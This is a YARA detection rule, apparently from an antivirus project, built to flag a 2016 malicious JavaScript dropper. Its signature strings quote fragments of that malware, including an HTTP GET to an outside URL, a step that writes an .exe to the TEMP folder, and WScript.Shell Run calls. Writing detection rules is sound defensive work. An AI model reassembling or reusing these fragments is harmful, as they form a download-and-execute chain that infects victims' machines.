rule sig_20160328_7bb9fc8113108cf100fed5f71390232a {
  meta:
    description = "datamaliciousorder - file 20160328_7bb9fc8113108cf100fed5f71390232a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "03140f9d6236f2c94b16390a8ccf62f87587fe21661e2c8ada41cbb1d8ca0f81"

  strings:
    $s1  = "function Chwlti() {return Vfxcijzgly[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"kUdUMEFFLlhArHM.exe\";};" fullword ascii
    $s2  = "Mbegglz[Stpcc](\"GET\", \"http://theaffiliatetribe.com/o3uska\", false);" fullword ascii
    $s3  = "do {WScript[Pxvckm](Imhjpqqi() * 11)} while (Mbegglz[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Vfxcijzgly = function Xoibjgc() {return WScript[Spbog](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Lqulle(Kcbqjnidk, Zgwxoekcs){return Kcbqjnidk - Zgwxoekcs;};" fullword ascii
    $s6  = "function Nyxcdqlbjl() {return ((Pspwt == true) && (Pspwt == Ldbjnn)) ? 1 : Pxfzfmgeo;};" fullword ascii
    $s7  = "function Chcwek(Xvyardb){Vfxcijzgly[\"Run\"](Xvyardb, Pxfzfmgeo, Pxfzfmgeo);};" fullword ascii
    $s8  = "return Lqulle(Ogday, Qcnso);" fullword ascii
    $s9  = "var Ldbjnn = false;" fullword ascii
    $s10 = "Ldbjnn = true; " fullword ascii
    $s11 = "var Otrodnygtd = false;" fullword ascii
    $s12 = "function Soaee(){return Axckl;};" fullword ascii
    $s13 = " while (Gpjzpuqyxj){" fullword ascii
    $s14 = "function Jdvns()" fullword ascii
    $s15 = "function Vawccqrp(Zwnmczlf) {var Otragfay = (1, 2, 3, 4, 5, Zwnmczlf); return Otragfay;};" fullword ascii
    $s16 = "function Imhjpqqi(){return 22;};" fullword ascii
    $s17 = "var Hqdfcgngi = new this[\"Date\"]();" fullword ascii
    $s18 = "function Iptvs(){return Spbog;};" fullword ascii
    $s19 = "var Pspwt = false;" fullword ascii
    $s20 = "Pspwt = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}